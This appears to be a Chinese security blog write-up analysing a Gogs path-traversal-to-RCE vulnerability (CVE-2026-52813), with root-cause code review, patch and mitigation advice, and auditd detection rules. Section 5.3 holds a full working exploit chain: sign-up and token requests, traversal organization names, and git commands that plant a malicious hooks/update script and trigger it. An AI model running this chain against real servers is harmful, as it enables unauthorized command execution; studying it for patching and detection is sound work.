---
title: Gogs 组织名称路径遍历导致远程代码执行（CVE-2026-52813）
date: 2026-07-13
publishedAt: 2026-07-13T22:16:32+08:00
category: 漏洞分析
summary: 从组织创建 API 的名称校验缺陷出发，分析路径遍历如何将仓库写入 local-r 工作树，并通过覆盖 Git hooks/update 构造远程代码执行链。
slug: gogs-organization-name-path-traversal-rce
coverText: GG
published: true
---

> **实验说明：** 本文记录授权测试环境中的漏洞复现与代码审计过程。请求、Token、账号及命令均为实验数据，请勿用于未授权目标；建议在隔离容器或测试虚拟机中完成验证。

## 1. 漏洞简介

Gogs 是一款基于 Go 语言开发的开源自托管 Git 服务，提供代码托管、仓库管理、Issue 跟踪、Wiki 等功能，支持通过 Docker 或二进制方式部署，广泛应用于个人开发者和小型团队的私有代码管理场景。

## 2. 漏洞概述

**漏洞编号：CVE-2026-52813**

Gogs 在创建组织（Organization）时，未对组织名称进行路径遍历字符（如 `../`）的过滤或清理。源码文件 `internal/database/org.go` 中直接调用 `os.MkdirAll(repox.UserPath(org.Name))`，而 `internal/repox/repox.go` 中的 `UserPath` 函数未对 `org.Name` 做任何路径清理处理，导致攻击者可以将组织名称设置为包含路径遍历序列的字符串（如 `../../../../data/gogs/data/tmp/local-r/1/nested`）。当在该恶意组织下创建仓库时，仓库数据被写入到路径遍历解析后的任意文件系统位置。默认配置下 Gogs 开启自助注册，攻击者仅需自助注册一个普通账号（无需管理员审批或授权）即可利用此漏洞：将仓库写入另一个仓库的本地工作树目录中，进而通过 Git 操作覆写目标仓库的 `hooks/update` 脚本，注入恶意 Shell 命令。当 Gogs 与目标仓库交互触发 Git Hook 时，注入的命令即作为 `git` 用户执行，实现远程代码执行，导致服务器遭受严重入侵（以 `git` 用户身份执行任意系统命令）。

## 3. 利用条件

### 3.1 影响版本

- Gogs `>= 0.2.0, < 0.14.3`，即 0.2.0 至 0.14.2。
- Go 模块 `gogs.io/gogs >= v0.0.0-20140322175050, < v0.14.3`。

### 3.2 所需权限

攻击者需要一个平台普通用户账号即可远程利用。默认开放自助注册的实例攻击面更大；公开资料中已经存在可用 PoC。

## 4. 环境搭建

```bash
docker pull gogs/gogs:0.14.1
```

拉取镜像后，按照实验网络与数据卷规划启动容器并完成初始化。本文复现环境的运行状态如下：

![Gogs 漏洞分析截图 01](/assets/posts/gogs-organization-name-path-traversal-rce/20260626214100915.png)

## 5. 漏洞复现

### 5.1 复现结果

![Gogs 漏洞分析截图 02](/assets/posts/gogs-organization-name-path-traversal-rce/20260626213252151.png)

### 5.2 公开 PoC

[公开 PoC：JorianWoltjer Gist](https://gist.github.com/JorianWoltjer/4b72063338b27140f4439c524d98f2b9)

### 5.3 复现流程

#### 5.3.1 注册攻击者账号

```http
POST /user/sign_up HTTP/1.1
Host: 192.168.131.134:3000
Content-Type: application/x-www-form-urlencoded

 _csrf=xxx&user_name=hongzh0&email=hongzh0%40test.local&password=123456&retype=123456
```

---

#### 5.3.2 获取 API Token

```http
POST /api/v1/users/hongzh0/tokens HTTP/1.1
Host: 192.168.131.134:3000
Authorization: Basic aG9uZ3poMDoxMjM0NTY=
Content-Type: application/json

{"name":"api"}
```

Authorization 为 `hongzh0:123456` 的 base64。

---

#### 5.3.3 创建 Writer 仓库

```http
POST /api/v1/user/repos HTTP/1.1
Host: 192.168.131.134:3000
Authorization: token 717ebfaf0bc1eddbb5e63c98ec34c71db6653a8e
Content-Type: application/json

{"name":"writer-42c09a64","description":"writer repo for poc","private":false,"auto_init":true,"readme":"Default"}
```

---

#### 5.3.4 Web Editor 写 Dummy 文件（触发 local-r 工作树创建）

如果跳过此步骤，`local-r/X/.git` 不存在，后续 push 无法触发 `git reset --hard`。

**4a. Web 登录获取 Session Cookie：**

```http
POST /user/login HTTP/1.1
Host: localhost:3000
Content-Type: application/x-www-form-urlencoded

_csrf=xxx&user_name=hongzh0&password=123456&login_source=0
```

**4b. Web Editor 创建文件：**

```http
POST /hongzh0/writer-42c09a64/_new/main/ HTTP/1.1
Host: localhost:3000
Content-Type: application/x-www-form-urlencoded

_csrf=xxx&last_commit=xxx&tree_path=dummy.txt&content=dummy&commit_summary=&commit_message=&commit_choice=direct&new_branch_name=
```

文件创建成功，同时 Gogs 在 `/data/gogs/data/tmp/local-r/1/` 创建完整 git clone

---

#### 5.3.5 查询 Writer 仓库 ID（local-r 编号）

```http
GET /api/v1/repos/hongzh0/writer-42c09a64 HTTP/1.1
Host: 192.168.131.134:3000
Authorization: token 717ebfaf0bc1eddbb5e63c98ec34c71db6653a8e
```

`id=1` → 工作树路径为 `/data/gogs/data/tmp/local-r/1/`

---

#### 5.3.6 创建恶意组织（路径遍历注入）

```http
POST /api/v1/user/orgs HTTP/1.1
Host: 192.168.131.134:3000
Authorization: token 717ebfaf0bc1eddbb5e63c98ec34c71db6653a8e
Content-Type: application/json

{"username":"../../../../../data/gogs/data/tmp/local-r/1/nessted","full_name":"deep"}
```

**注意:** Docker 容器内 `/app/gogs/data` → `/data/gogs/data` 是 symlink，需要 **5 层** `../`（裸机部署用 4 层）。

组织目录创建在 local-r/1/ 工作树内

---

#### 5.3.7 在恶意组织下创建仓库

```http
POST /api/v1/org/..%2F..%2F..%2F..%2F..%2Fdata%2Fgogs%2Fdata%2Ftmp%2Flocal-r%2F1%2Fnessted/repos HTTP/1.1
Host: 192.168.131.134:3000
Authorization: token 717ebfaf0bc1eddbb5e63c98ec34c71db6653a8e
Content-Type: application/json

{"name":"rce-9d862f6c","description":"poc","private":false,"auto_init":true,"readme":"Default"}
```

**编码规则:** Org 名中的 `/` 全编码为 `%2F`，但 org 和 repo 名之间的 `/` 保持原始 `/`（不编码）

---

#### 5.3.8 Clone Writer → 注入 Hook → Push

```bash
git clone http://hongzh0:123456@127.0.0.1:3000/hongzh0/writer-42c09a64.git
cd writer-42c09a64
git config user.email "poc@test.local"
git config user.name "poc"
mkdir -p nessted/rce-9d862f6c.git/hooks
echo 'id > pwned' > nessted/rce-9d862f6c.git/hooks/update
chmod +x nessted/rce-9d862f6c.git/hooks/update
git add -A
git commit -m "inject hook"
git push origin main
```

Push 将恶意 hook 文件写入 Writer 仓库的 bare repo（位于 `/data/gogs/data/git/gogs-repositories/hongzh0/writer-42c09a64.git`）。但此时 local-r/1 工作树尚未同步，嵌套裸仓库的 hooks 仍是 Gogs 默认包装器。

---

#### 5.3.9 API Sync Writer（触发 git reset --hard，覆盖 Hook）

```http
PUT /api/v1/repos/hongzh0/writer-42c09a64/contents/sync1.txt HTTP/1.1
Host: 192.168.131.134:3000
Authorization: token 717ebfaf0bc1eddbb5e63c98ec34c71db6653a8e
Content-Type: application/json

{"message":"sync workspace","content":"c3luYw==","branch":"main"}
```

此操作触发 Gogs 执行：`git --work-tree=/data/gogs/data/tmp/local-r/1 reset --hard`，Writer 仓库的最新状态（含恶意 hook）覆盖 local-r/1 工作树，**覆盖嵌套裸仓库 `rce-9d862f6c.git/hooks/update`**。

---

#### 5.3.10 Trigger Org 仓库（触发 Hook 执行）

```http
PUT /api/v1/repos/..%2F..%2F..%2F..%2F..%2Fdata%2Fgogs%2Fdata%2Ftmp%2Flocal-r%2F1%2Fnessted/rce-9d862f6c/contents/trigger.txt HTTP/1.1
Host: 192.168.131.134:3000
Authorization: token 717ebfaf0bc1eddbb5e63c98ec34c71db6653a8e
Content-Type: application/json

{"message":"trigger rce","content":"dHJpZ2dlcg==","branch":"main"}
```

**编码注意:** org 名部分（直到 `nessted`）全编码，repo 名 (`rce-9d862f6c`) 和后续路径 (`contents/trigger.txt`) 用原始 `/`。

Gogs 操作 org 仓库时执行 Git 命令 → 触发 `hooks/update` → 命令 `id > pwned` 以 git 用户身份执行。

---

#### 5.3.11 API Sync Writer（拉取 pwned 回显）

```http
PUT /api/v1/repos/hongzh0/writer-42c09a64/contents/sync2.txt HTTP/1.1
Host: 192.168.131.134:3000
Authorization: token 717ebfaf0bc1eddbb5e63c98ec34c71db6653a8e
Content-Type: application/json

{"message":"sync result","content":"c3luYzI=","branch":"main"}
```

再次触发 `git reset --hard`，由于 `pwned` 文件位于工作树内（由 hook 创建），它被识别为新增文件出现在工作树中。

---

#### 5.3.12 获取 RCE 回显

**实例 URL：** `http://192.168.131.134:3000/hongzh0/writer-42c09a64/raw/main/nessted/rce-9d862f6c.git/pwned`
![Gogs 漏洞分析截图 03](/assets/posts/gogs-organization-name-path-traversal-rce/20260704163850811.png)

## 6. 漏洞分析

### 6.1 路径遍历的实现

`internal/route/api/v1/api.go` 定义了 REST API 路由；是否使用 `reqToken()` 可以帮助判断接口所需的认证权限。

![Gogs 漏洞分析截图 04](/assets/posts/gogs-organization-name-path-traversal-rce/20260628005521946.png)

路由采用分层映射，组织创建接口最终对应 `/api/v1/user/orgs`。

![Gogs 漏洞分析截图 05](/assets/posts/gogs-organization-name-path-traversal-rce/20260629115650861.png)

继续查看 `CreateOrgOption`，可以看到 `UserName` 直接承接用户输入，仅进行了非空检查，没有路径规范化或格式约束。

![Gogs 漏洞分析截图 06](/assets/posts/gogs-organization-name-path-traversal-rce/20260629145605625.png)

从 `api.go` 跟入 `CreateMyOrg` 和 `CreateOrgForUser`：

![Gogs 漏洞分析截图 07](/assets/posts/gogs-organization-name-path-traversal-rce/20260629102248083.png)

![Gogs 漏洞分析截图 08](/assets/posts/gogs-organization-name-path-traversal-rce/20260629104759871.png)

`CreateOrgForUser` 主要检查用户名是否已存在以及是否被禁止，但这些检查并未覆盖路径遍历输入。继续进入 `CreateOrganization`，第一层调用为 `isUsernameAllowed`。

![Gogs 漏洞分析截图 09](/assets/posts/gogs-organization-name-path-traversal-rce/20260629113824454.png)

`isUsernameAllowed` 使用 `reservedUsernames` 作为保留名称黑名单：

![Gogs 漏洞分析截图 10](/assets/posts/gogs-organization-name-path-traversal-rce/20260629113931774.png)

![Gogs 漏洞分析截图 11](/assets/posts/gogs-organization-name-path-traversal-rce/20260629114016649.png)

因此，从 API 创建组织时主要经过以下三类检查：

1. 名称是否为空。
2. 名称是否已经存在。
3. 名称是否与保留名称黑名单完全匹配。

黑名单虽然包含 `.` 和 `..`，但 `isUsernameAllowed` 采用完整字符串匹配。输入为 `..` 时会被拦截，输入为 `../` 或更长的路径遍历序列时则不会命中黑名单。

![Gogs 漏洞分析截图 12](/assets/posts/gogs-organization-name-path-traversal-rce/20260629113549076.png)

![Gogs 漏洞分析截图 13](/assets/posts/gogs-organization-name-path-traversal-rce/20260629114555991.png)

![Gogs 漏洞分析截图 14](/assets/posts/gogs-organization-name-path-traversal-rce/20260629114653406.png)

Web 端组织创建路由位于 `internal/cmd/web.go`：

![Gogs 漏洞分析截图 15](/assets/posts/gogs-organization-name-path-traversal-rce/20260629152450598.png)

Web 端的 `CreateOrg` 使用了额外的名称格式校验：

![Gogs 漏洞分析截图 16](/assets/posts/gogs-organization-name-path-traversal-rce/20260629152740483.png)

其中 `AlphaDashDot` 是 Macaron 框架提供的正则校验规则。API 调用链没有应用这项规则，因此 Web 表单受到约束，并不代表对应 API 同样安全。

![Gogs 漏洞分析截图 17](/assets/posts/gogs-organization-name-path-traversal-rce/20260629153143065.png)

继续查看 `CreateOrganization`：

![Gogs 漏洞分析截图 18](/assets/posts/gogs-organization-name-path-traversal-rce/20260629104441652.png)

函数调用 `os.MkdirAll()` 创建组织目录，并通过 `UserPath(org.Name)` 生成目标路径。跟入 `UserPath` 后可以看到，组织名称仅转为小写，随后直接参与路径拼接。

![Gogs 漏洞分析截图 19](/assets/posts/gogs-organization-name-path-traversal-rce/20260629111004631.png)

![Gogs 漏洞分析截图 20](/assets/posts/gogs-organization-name-path-traversal-rce/20260629111224900.png)

项目在 `internal/pathutil/pathutil.go` 中已经存在用于阻止路径越界的辅助函数，但该组织创建调用链没有使用它。

![Gogs 漏洞分析截图 21](/assets/posts/gogs-organization-name-path-traversal-rce/20260629112352680.png)

最终，攻击者可以通过组织名称中的 `../` 序列改变仓库目录落点，再结合 Git 工作树同步和 Hook 覆盖完成 RCE 利用链。

### 6.2 RCE 的实现

RCE 阶段与路径遍历阶段所需权限一致：攻击者只需要一个 Gogs 普通用户账号。

Gogs 创建仓库时会在磁盘上生成 Git 裸仓库，并写入 `hooks/update` 等包装脚本。例如，正常的 `hooks/update` 会调用 `/app/gogs/gogs hook update`。当仓库发生特定 Git 操作时，这些 Hook 会由 Git 自动触发。

![Gogs 漏洞分析截图 22](/assets/posts/gogs-organization-name-path-traversal-rce/20260630161819871.png)

攻击链可以概括为三个阶段：

1. **路径错位：** 创建组织时在名称中插入路径遍历序列，Gogs 解析后将组织仓库创建到外层仓库的工作树 `/data/gogs/data/tmp/local-r/<repo-id>/nessted/` 中，而不是预期的仓库存储目录。
2. **覆盖 Hook：** 攻击者克隆外层 Writer 仓库，在嵌套仓库的 `hooks/update` 中写入测试命令并推送；随后触发 `git reset --hard`，让工作树中的恶意 Hook 覆盖 Gogs 原有包装器。
3. **触发执行：** 攻击者通过 API 操作嵌套仓库，引发 Git 操作并触发已被覆盖的 `hooks/update`。命令以 `git` 用户身份执行，结果再通过 Writer 仓库的 Raw 端点读取。

## 7. 修复建议

### 7.1 版本自查

```bash
docker exec cve-2026-52813-target /app/gogs/gogs --version
```

![Gogs 漏洞分析截图 23](/assets/posts/gogs-organization-name-path-traversal-rce/20260626214405007.png)

### 7.2 Gogs 升级

```bash
# 下载最新版本
wget https://github.com/gogs/gogs/releases/download/v0.14.3/gogs_v0.14.3_linux_amd64.tar.gz

# 解压
tar -xzf gogs_v0.14.3_linux_amd64.tar.gz

# 停止服务后替换
systemctl stop gogs
cp gogs /path/to/gogs/gogs

# 重启服务
systemctl start gogs
```

### 7.3 临时缓解措施

#### 7.3.1 禁用用户自助注册

编辑 Gogs 配置文件 custom/conf/app.ini，在 [auth] 段中禁用自助注册，阻止攻击者创建新账户：

```ini
[auth]
DISABLE_REGISTRATION = true
```

修改后重启 Gogs 服务使配置生效：

```bash
systemctl restart gogs

# Docker 部署
docker restart gogs
```

注意：此措施不能防御已注册的恶意用户，且不影响管理员手动创建用户。

#### 7.3.2 以受限用户运行 Gogs 进程

将 Gogs 服务运行的 git 用户限制在最小权限下，减小 RCE 后的影响范围：

创建受限的 Gogs 用户：

```bash
useradd -r -s /bin/false -d /data/gogs gogs
```

移除不必要的 sudo 权限

确保 `/etc/sudoers` 中没有 git 用户的 NOPASSWD 条目

限制 git 用户的 SSH 访问

在 `/home/git/.ssh/authorized_keys` 中添加 `command=` 限制

或在 Docker 中以非 root 用户运行

```bash
docker run -d --name=gogs -p 3000:3000 \
 --user 1000:1000 \
 -v /data/gogs:/data \
 gogs/gogs:0.14.3
```

#### 7.3.3 文件系统监控与利用痕迹检测

部署 auditd 规则监控 Gogs 数据目录之外的异常 Git 仓库写入：

```bash
# 监控工作树目录中非预期的 Hook 写入
auditctl -w /data/gogs/data/tmp/local-r/ -p wa -k gogs_hooks_write

# 监控 /tmp 下由 git 用户创建的文件
auditctl -w /tmp/ -p wa -k gogs_rce_indicator -F uid=$(id -u git)

# 查询审计日志
ausearch -k gogs_hooks_write --start recent
ausearch -k gogs_rce_indicator --start recent
```

---

> **再次强调：** 临时缓解措施无法保证对所有攻击向量的防护，**尽快升级**是唯一的彻底解决方案。

## 8. 参考链接

1. [GitHub Advisory：GHSA-c39w-43gm-34h5](https://github.com/advisories/GHSA-c39w-43gm-34h5)
2. [Gogs 修复提交](https://github.com/gogs/gogs/commit/f6acd467305943aae8403cbac81f0118dd1235d7)
3. [Gogs v0.14.3 Release](https://github.com/gogs/gogs/releases/tag/v0.14.3)
4. [NVD：CVE-2026-52813](https://nvd.nist.gov/vuln/detail/CVE-2026-52813)
5. [VulDB：CVE-2026-52813](https://vuldb.com/cve/CVE-2026-52813)
6. [Miggo 漏洞数据库](https://www.miggo.io/vulnerability-database/cve/CVE-2026-52813)
7. [GitLab Advisory Database](https://advisories.gitlab.com/golang/gogs.io/gogs/CVE-2026-52813/)
8. [公开 PoC Gist](https://gist.github.com/JorianWoltjer/4b72063338b27140f4439c524d98f2b9)
9. [安全客文章转载索引](https://www.secrss.com/articles/91633)
10. [GM7 相关文章](https://www.gm7.org/archives/117672)
11. [SecAlerts：CVE-2026-52813](https://secalerts.co/vulnerability/CVE-2026-52813)
